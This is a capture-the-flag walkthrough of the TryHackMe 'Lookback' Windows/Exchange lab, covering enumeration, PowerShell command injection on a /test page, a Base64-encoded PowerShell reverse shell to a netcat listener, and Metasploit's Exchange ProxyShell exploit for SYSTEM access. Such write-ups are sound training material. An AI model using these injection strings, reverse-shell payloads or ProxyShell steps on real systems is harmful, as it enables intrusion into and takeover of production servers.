# [Lookback](https://tryhackme.com/room/lookback)

## You’ve been asked to run a vulnerability test on a production environment.

# Find the flags

The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?

_Sometimes to move forward, we have to go backward._
_So if you get stuck, try to look back!_

### What is the service user flag?

_Have you checked all the paths?_

1. Enumerate services with `nmap`:

```bash
nmap -sC -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  https?
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2026-04-21T18:41:36
|_Not valid after:  2026-10-21T18:41:36
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-22T18:56:03+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> `443/tcp` open with HTTPS and cert common name `WIN-12OUO7A66M7.thm.local`

2. Run a web scanner to identify Exchange/Autodiscover endpoints:

```bash
nikto --url <TARGET_IP> | tee nikto-results
```

**Results:**

```
...
+ [999986] /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ [999100] /Autodiscover/Autodiscover.xml: Uncommon header(s) 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ [999100] /Rpc: Uncommon header(s) 'request-id' found, with contents: c42f0786-a329-4e9f-9203-f9fce9a5ce01.
+ [700025] /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16
...
```

> default account found at `/Rpc` for `admin:admin`

3. Add the hostname to `hosts` so the HTTPS certificate matches:

```bash
echo "<TARGET_IP> WIN-12OUO7A66M7.thm.local" >> /etc/hosts
```

4. Discover hidden directories with gobuster:

```bash
gobuster dir -u https://win-12ouo7a66m7.thm.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k --exclude-length 0
```

**Results:**

```
test                 (Status: 401) [Size: 1293]
```

5. Visit `https://win-12ouo7a66m7.thm.local/test/` and inspect the page. The first flag is on this page.

[SCREEN01]

---

### What is the user flag?

_Reading can change your perspective!_

1. The `/test` page accepts input that is inserted into a PowerShell expression like:

```
Get-Content('C:\<input>')
```

Typing a random string shows:

```
Get-Content : Cannot find path 'C:\test' because it does not exist.
At line:1 char:1
+ Get-Content('C:\test')
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\test:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

2. The page is vulnerable to command injection. For example:

```
') | whoami ('
```

This returns:

```
Get-Content : Access to the path 'C:\' is denied.
At line:1 char:1
+ Get-Content('C:\') | whoami ('')
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

thm\admin
```

> So the web application is executing injected PowerShell commands.

3. Start a listener on your machine:

```bash
nc -lvnp 4444
```

4. Use a Base64-encoded PowerShell (`PowerShell #3 (Base64)`) reverse shell payload from `https://www.revshells.com/`:

```
') | powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== ('
```

5. From the reverse shell, read the user flag:

```bash
cd C:\users\dev\desktop
type user.txt
```

[SCREEN02]

---

### What is the root flag?

_All the way back! Where did you start?_

1. From the shell, inspect the file system and find `TODO.txt:`

```bash
type TODO.txt
```

**Results:**

```
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

2. Use the Exchange ProxyShell vulnerability to get SYSTEM/root.

```bash
msfconsole
search microsoft exchange
use exploit/windows/http/exchange_proxyshell_rce
options
set EMAIL dev-infrastracture-team@thm.local
set RHOST <TARGET_IP>
set LHOST <ATTACKER_IP>
run
shell
```

3. After successful exploitation, read the root flag:

```bash
cd c:\users\administrator\documents
dir
type flag.txt
```

[SCREEN03]
